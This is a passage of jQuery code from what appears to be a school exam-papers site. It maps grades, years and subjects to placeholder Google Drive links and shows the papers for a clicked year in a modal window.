              { name: "---------------", link: "link_to_drive_file_1" },
              { name: "---------------", link: "link_to_drive_file_2" }
            ],
            "Physical Sciences": [
              { name: "---------------", link: "link_to_drive_file_3" },
              { name: "---------------", link: "link_to_drive_file_4" }
            ],
            "Accounting": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" }

            ],
          }
        }
      };
      
      // Define exam papers data (replace with your actual data)
     /* var examPapers = {
        "Grade 11": {
          "2020": {
            "Life Sciences": [
              { name: "January Life Sciences 2020", link: "link_to_drive_file_1" },
              { name: "June Life Sciences 2020", link: "link_to_drive_file_2" }
            ],
            "Physical Sciences": [
              { name: "January Physical Sciences 2020", link: "link_to_drive_file_3" },
              { name: "June Physical Sciences 2020", link: "link_to_drive_file_4" }
            ]
            // Add more subjects and exam papers as needed
          }
          // Add more years as needed
    
        },
        "Grade 12": {
          "2020": {
            "Life Sciences": [
              { name: "January Life Sciences 2020", link: "link_to_drive_file_5" },
              { name: "June Life Sciences 2020", link: "link_to_drive_file_6" }
            ],
            "Physical Sciences": [
              { name: "January Physical Sciences 2020", link: "link_to_drive_file_7" },
              { name: "June Physical Sciences 2020", link: "link_to_drive_file_8" }
            ]
            // Add more subjects and exam papers as needed
          }
          // Add more years as needed
        }
      };
    */
      // Display exam papers when a year is clicked
      $('.year').on('click', function(){
        var year = $(this).data('year');
        var grade = $(this).closest('.category').find('h3').text().trim();
        var subjects = examPapers[grade][year];
        displayPapersModal(subjects, year, grade); // Call displayPapersModal function
      });
      
      // Function to display exam papers in a modal
      function displayPapersModal(subjects, year, grade) {
        var modalHTML = '<div class="modal"><div class="modal-content"><span class="close">&times;</span><h3>' + grade + ' - ' + year + '</h3>';
        modalHTML += '<ul>';
        $.each(subjects, function(subject, papers){
          modalHTML += '<li><strong>' + subject + '</strong><ul>';
          $.each(papers, function(index, paper){
            modalHTML += '<li><a href="' + paper.link + '" target="_blank">' + paper.name + '</a></li>';
          });
          modalHTML += '</ul></li>';
        });
        modalHTML += '</ul></div></div>';
        $('body').append(modalHTML);
        
        // Show the modal
        $('.modal').css('display', 'block');
        
        // Close modal when close button or outside the modal is clicked
        $('.close, .modal').on('click', function() {
          $('.modal').remove();
        });
    
        // Prevent modal from closing when clicking inside the modal content
        $('.modal-content').on('click', function(event) {
          event.stopPropagation();
        });
      }
    });
    
    // Function to open modal
function openModal() {
  $('.modal').css('display', 'block');
  $('body').addClass('modal-open'); // Add modal-open class to body
}

// Function to close modal
function closeModal() {
  $('.modal').css('display', 'none');
  $('body').removeClass('modal-open'); // Remove modal-open class from body
}

// Call openModal() when a year is clicked
$('.year').on('click', function(){
  // Your existing code to display modal content
  openModal();
});

// Call closeModal() when close button or outside modal is clicked
$('.close, .modal').on('click', function() {
  closeModal();
});

